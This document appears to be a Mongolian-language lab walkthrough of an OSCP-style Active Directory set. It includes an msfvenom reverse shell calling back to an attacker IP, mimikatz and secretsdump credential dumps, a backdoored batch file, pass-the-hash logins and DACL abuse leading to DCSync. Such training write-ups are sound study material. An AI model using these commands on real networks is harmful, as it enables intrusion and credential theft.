# AD Set

## WS26

## Initial access

Username: r.andrews
Password: BusyOfficeWorker890

```bash
xfreerdp /u:r.andrews /d:oscp.exam /v:192.168.110.206
```

[image]

Мэдээж системд орсон даруйдаа бүхий л арга замуудыг тодорхойлж, боломжтой бүх хувилбаруудаар оролдож үзсэн. Харин Offsec сургалтын үеэр тэмдэглэж авсан Windows Privilege Escalation аргачлал надад тус болсон.

[image]

## Unquoted Service Path

```bash
powershell -ep bypass
import-module .\PowerUp.ps1
Get-UnquotedService
```

[image]

### Generate malicious file

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.49.110 LPORT=443 -f exe -o shell.exe
```

[image]

```
C:\Program Files\Offsec NIC> copy .\rev.exe .\Queue.exe
```

[image]

### Start NICQueueSvc service

```bash
net stop NICQueueSvc
net start NICQueueSvc
```

[image]

## Shell as administrator

[image]

Одоо заавал тогтворгүй админ shell -ээс үйлдэл хийхийн оронд r.andrews хэрэглэгчид administrator эрх олгох нь маш зүгээр.

[image]

mimikatz-н гаралтууд дээр ямар нэгэн чухал мэдээлэл байгаагүй тул цааш үргэлжлүүлэв.

```bash
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "lsadump::sam" "lsadump::secrets" exit
```

[image]

### C.rogers

**Login:** WinterStormEcho459

Энэ удаад нилээн гацаж байгаад r.andrews хэрэглэгчээр xampp/mysql -рүү хандаж чадахгүй байснаа санаад админ эрхээр хандаж c.rogers@oscp.exam хэрэглэгчийн нэвтрэх эрхийг олов.

[image]

Систем дэх `xampp\mysql\data\offsecnic_db` датабэйсээс `c.rogers` хэрэглэгчийн нууц үгийг ил текстээр олж авсан

```bash
net localgroup administrators c.rogers /add
```

[image]

## SRV22

```bash
nxc winrm 172.16.110.202 -u c.rogers -p 'WinterStormEcho459'
```

[image]

Системд орсон даруйд би C:\ фолдерийг шалгаж үзсэн бөгөөд дотор нь admin эрхээр ажилладаг script файл байгааг мэдсэн үргэлжлүүлэн @bat файлыг ашиглан өөртөө админ эрх өгөх боломжтой файл бэлдэж сервер рүү хуулж, health-check.bat-тай сольж байршуулсан.

[image]

Modifable файл

[image]

**Ашигласан bat файл.**

```batch
@echo off
:: Check for permissions
net session >nul 2>&1
if %errorLevel% == 0 (
    goto :admin
) else (
    echo Requesting administrative privileges...
    powershell Start-Process -FilePath "%0" -Verb RunAs
    exit /b
)

:admin
:: Your commands go here
net localgroup Administrators c.rogers /add
pause
```

[image]

```bash
upload good.bat
move health-check.bat health-check.bat.bak
move good.bat health-check.bat
```

[image]

Хэсэг хугацааны дараа өөрийн c.rogers-н эрхийг шалгаад үзвэл administrator хэрэглэгч болсон байна. Гэхдээ offsec-н дүрмийн дагуу тухайн системд заавал үндсэн administrator хэрэглэгчээр нэвтрэх ёстой байдаг тул `impacket-secretsdump` ашиглан үндсэн админы хэшийг гаргаад дараа нь нэвтрэе.

[image]

### Dumping credentials

```bash
impacket-secretsdump c.rogers@172.16.110.202
```

[image]

## Shell as administrator

```bash
evil-winrm -i 172.16.110.202 -u administrator -H bc6f9f0a1b2f789fdea11def1bbaed9a
```

[image]

### Powershell history check

Үргэлжлүүлэн энэ машинаас DC20 -руу нэвтрэх боломжтой windows credentials theft аргыг ашиглан Powershell history -г гаргаж o.hughes хэрэглэгчийн эрхийг олж авсан.

```bash
(Get-PSReadLineOption).HistorySavePath
```

```bash
type C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

**Login credentials:** o.hughes:VaultKeyNight582

[image]

## Bloodhound map

Эндээс тухайн хэрэглэгч юу хийх боломжтойг харж болно.

```bash
bloodhound-python -d oscp.exam -u c.rogers -p WinterStormEcho459 -c All -op default_kali_bloodhoundpy --zip -ns 172.16.110.200
```

**AddMember about**

o.hughes хэрэглэгч нь AddMember эрхтэй буюу өөрийгөө "IT OPERATIONS" бүлэгт нэмэх эрхтэй байна.

[image]

**WriteDacl about**

Хэрэв бид o.hughes-г амжилттай тухайн бүлэгт нэмж чадвал IT OPERATIONS бүлгээр дамжуулж Domain-руу шууд WriteDacl хийх боломжтой байна.

[image]

### AddMember

```bash
bloodyAD -u o.hughes -p 'VaultKeyNight582' -d oscp.exam --host 172.16.110.200 add groupMember "IT OPERATIONS" o.hughes
```

[image]

### WriteDacl

```bash
impacket-dacledit -action 'write' -rights 'FullControl' -principal 'o.hughes' -target-dn 'DC=OSCP,DC=EXAM' 'OSCP.EXAM'/'o.hughes':'VaultKeyNight582' -dc-ip 172.16.110.200
```

[image]

```bash
bloodhound-python -d oscp.exam -u o.hughes -p VaultKeyNight582 -c All -op default_kali_bloodhoundpy --zip -ns 172.16.110.200
```

[image]

[image]

[image]

[image]

[image]

## GenericAll

The AllExtendedRights permission grants O.HUGHES@OSCP.EXAM both the DS-Replication-Get-Changes and DS-Replication-Get-Changes-All permission, which combined allow a principal to replicate objects from the domain OSCP.EXAM.

[image]

```bash
impacket-secretsdump 'oscp.exam'/'o.hughes':'VaultKeyNight582'@172.16.110.200
```

[image]

## Shell as administrator - DC20

```bash
evil-winrm -i 172.16.110.200 -u administrator -H a8cb84c0c6b10beaa90e38b297e1d87e
```

[image]

### Ligolo

[image]

[image]
